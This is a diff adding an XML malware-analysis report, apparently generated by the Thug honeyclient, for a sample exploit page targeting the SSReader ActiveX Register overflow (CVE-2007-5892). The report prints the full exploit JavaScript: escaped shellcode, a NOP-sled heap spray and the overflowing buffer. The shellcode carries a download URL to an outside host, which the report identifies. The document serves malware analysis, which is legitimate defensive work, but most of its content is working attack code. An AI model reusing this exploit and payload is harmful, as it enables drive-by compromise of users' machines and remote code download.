@@ -1,0 +1,110 @@
+<MAEC_Bundle xmlns:ns1="http://xml/metadataSharing.xsd" xmlns="http://maec.mitre.org/XMLSchema/maec-core-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd" id="maec:thug:bnd:1" schema_version="1.100000">
+    <Analyses>
+        <Analysis start_datetime="2012-12-11 20:57:13.715125" id="maec:thug:ana:2" analysis_method="Dynamic">
+            <Subject>
+                <Object object_name="http://127.0.0.1/thug/samples/./exploits/ssreader_noplus.html" type="URI" id="maec:thug:obj:3">
+                    <Associated_Code>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Javascript" id="maec:thug:cde:7">
+                                <Discovery_Method tool_id="maec:thug:tol:6" method="Dynamic Analysis"/>
+                                <Code_Segment>
+					window.onerror=function(){return true;}
+				</Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Javascript" id="maec:thug:cde:9">
+                                <Discovery_Method tool_id="maec:thug:tol:8" method="Dynamic Analysis"/>
+                                <Code_Segment>
+					
+					var haimeng14=unescape("%uf3b5%u32ec%ueb64%uec64%ub12a%u2db2%uefe7%u1b07%u1011%uba10%ua3bd%ua0a2%uefa1");
+					var haimeng16=unescape("%u90"+"90");
+					var haimeng99=unescape("%u212e");
+					var haimeng15=unescape("%u7468%u7074%u2f3a%u6c2f%u622e%u6775%u7578%u2e65%u6f63%u2f6d%u7771%u7265%u632f%u2e78%u7363%u0073");
+					var haimeng11=unescape("%ub5eb%u64bc%u0d35%ubd18%u0f10%u64ba%u6403%ue792%ub264%ub9e3%u9c64%u64d3%uf19b%uec97");
+					var haimeng4=unescape("%uefef%uaa66%ub9ff%u2e87%u0a96%u0757%uef29%uefef%uaa66%uaffb%ud76f%u9a2c%u6615%uf7aa");
+					var haimeng6=unescape("%u9fc0%u7807%uefef%u66ef%uf3aa%u2a64%u2f6c%u66bf%ucfaa%u1087%uefef%ubfef%uaa64%u85fb");
+					var haimeng2=unescape("%u0703%uef11%uefef%uaa66%ub9eb%u7787%u6511%u07e1%uef1f%uefef%uaa66%ub9e7");
+					var haimeng=unescape("%u8001%uef33%ue243%uebfa%ue805%uffec%uffff%u8b7f%udf4e%uefef");
+					var haimeng0=unescape("%u0feb%u335b%u66c9%u80b9");
+					var haimeng12=unescape("%ub91c%u9964%ueccf%udc1c%ua626%u42ae%u2cec%udcb9%ue019%uff51%u1dd5%ue79b");
+					var haimeng8=unescape("%ue3aa%uee85%u64b6%uf7ba%uaf07%uefef%u85ef%ub7e8%uaaec%udccb%ubc34%u10bc%ucf9a%ubcbf%uaa64");
+					var haimeng9=unescape("%u85f3%ub6ea%uba64%u07f7%uefcc%uefef%uef85%u9a10%u64cf%ue7aa%ued85%u64b6%uf7ba%uff07%uefef");
+					var haimeng1=unescape("%u64ef%ue3af%u9f64%u42f3%u9f64%u6ee7%uef03%uefeb%u64ef%ub903%u6187%ue1a1");
+					var haimeng7=unescape("%ub6ed%uba64%u07f7%uef8e%uefef%uaaec%u28cf%ub3ef%uc191%u288a%uebaf%u8a97%uefef%u9a10%u64cf");
+					var haimeng3=unescape("%uca87%u105f%u072d%uef0d%uefef%uaa66%ub9e3%u0087%u0f21%u078f%uef3b");
+					var haimeng13=unescape("%uece2%uaf1d%u1e04%u11d4%u9ab1%ub50a%u0464%ub564%ueccb%u8932%ue364%u64a4");
+					var haimeng5=unescape("%ue806%uefee%ub1ef%u9a66%u64cb%uebaa%uee85%u64b6%uf7ba%u07b9%uef64%uefef%u87bf%uf5d9");
+					var haimeng10=unescape("%u85ef%u6410%uffaa%uee85%u64b6%uf7ba%uef07%uefef%uaeef%ubdb4%u0eec%u0eec%u0eec%u0eec%u036c");
+					
+					heiba=haimeng16+haimeng16+haimeng0+haimeng+haimeng1+haimeng2+haimeng3+haimeng4+haimeng5+haimeng6+haimeng7+haimeng8+haimeng9+haimeng10+haimeng11+haimeng12+haimeng99+haimeng13+haimeng14+haimeng15;
+					var pkblack = haimeng16+haimeng16;
+					var headhaimeng = 20;
+					var i="i";
+					var ii="i";
+					var pkjuhaimeng = headhaimeng+heiba.length;
+					while (pkblack.length&lt;pkjuhaimeng) pkblack+=pkblack;
+					fillhaimeng = pkblack.substring(0, pkjuhaimeng);
+					codejuhaimeng = pkblack.substring(0, pkblack.length-pkjuhaimeng);
+					while(codejuhaimeng.length+pkjuhaimeng&lt;0x40000) codejuhaimeng = codejuhaimeng+codejuhaimeng+fillhaimeng;
+					modehaimeng = new Array();
+					for (x=0; x&lt;300; x++) modehaimeng[x] = codejuhaimeng + heiba;
+					var buffer = '';
+					while (buffer.length &lt; 3092) buffer+="\x0a\x0a\x0a\x0a";
+					pkpkhaimeng.Register(11,buffer);
+				</Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Assembly" id="maec:thug:cde:13">
+                                <Discovery_Method tool_id="maec:thug:tol:12" method="Static Analysis"/>
+                                <Code_Segment>
+					%u7468%u7074%u2f3a%u6c2f%u622e%u6775%u7578%u2e65%u6f63%u2f6d%u7771%u7265%u632f%u2e78%u7363%u0073
+				</Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Shellcode</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                    </Associated_Code>
+                    <Internet_Object_Attributes>
+                        <URI>http://127.0.0.1/thug/samples/./exploits/ssreader_noplus.html</URI>
+                    </Internet_Object_Attributes>
+                </Object>
+            </Subject>
+            <Tools_Used>
+                <Tool id="maec:thug:tol:1">
+                    <Name>Thug</Name>
+                    <Version>0.4.9</Version>
+                    <Organization>The Honeynet Project</Organization>
+                </Tool>
+            </Tools_Used>
+        </Analysis>
+    </Analyses>
+    <Behaviors>
+        <Behavior id="maec:thug:bhv:4">
+            <Description>
+                <Text>[HTTP] URL: http://127.0.0.1/thug/samples/./exploits/ssreader_noplus.html (Status: 200, Referrer: None)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:5" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:10">
+            <Purpose>
+                <Attempted_Vulnerability_Exploit vulnerability_type="Known">
+                    <Known_Exploit cve_id="CVE-2007-5892"/>
+                </Attempted_Vulnerability_Exploit>
+            </Purpose>
+            <Description>
+                <Text>[SSReader Pdg2 ActiveX] Register Method Overflow</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:11" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:14">
+            <Description>
+                <Text>[Shellcode Analysis] URL Detected: http://l.bugxue.com/qwer/cx.css</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:15" method="Static Analysis"/>
+        </Behavior>
+    </Behaviors>
+    <Pools/>
+</MAEC_Bundle>
